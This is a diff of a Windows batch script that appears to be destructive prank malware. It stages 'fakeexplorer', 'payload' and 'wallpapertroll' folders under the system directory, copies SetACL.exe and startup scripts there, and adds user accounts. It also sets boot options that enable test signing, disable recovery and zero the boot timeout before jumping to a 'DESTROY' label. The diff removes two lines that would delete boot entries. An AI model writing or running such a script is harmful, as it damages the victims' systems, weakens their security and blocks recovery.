@@ -207,11 +207,10 @@ net localgroup Guests beachball /add
 net user Dartz 1593570 /domain
 goto BCD
 :eeee
-mkdir c:\windows\fakeexplorer
-mkdir c:\windows\payload
-mkdir c:\windows\wallpapertroll
-mkdir c:\windows\junkins
-mkdir c:\windows\junkins\nssm
+cd %systemroot%
+mkdir fakeexplorer payload wallpapertroll junkins
+cd %systemroot%\junkins
+mkdir nssm
 xcopy "%CD%\junkins\startup\no.bat" "c:\windows\fakeexplorer" /y /q /h
 xcopy "%CD%\junkins\walp\walp.bmp" "c:\windows\wallpapertroll\walp.bmp" /y /q /h
 xcopy "%CD%\junkins\startup\SetACL.exe" "c:\windows\junkins\startup\SetACL.exe" /y /q /h
@@ -239,8 +238,6 @@ goto ADDONS
 bcdedit /set {current} TESTSIGNING on
 bcdedit /set {current} recoveryenabled No
 bcdedit /set {bootmgr} timeout 0
-bcdedit /delete {current}
-bcdedit /delete {bootmgr}
 goto DESTROY
 :ADDONS
 @rem --Additional Commands go below--
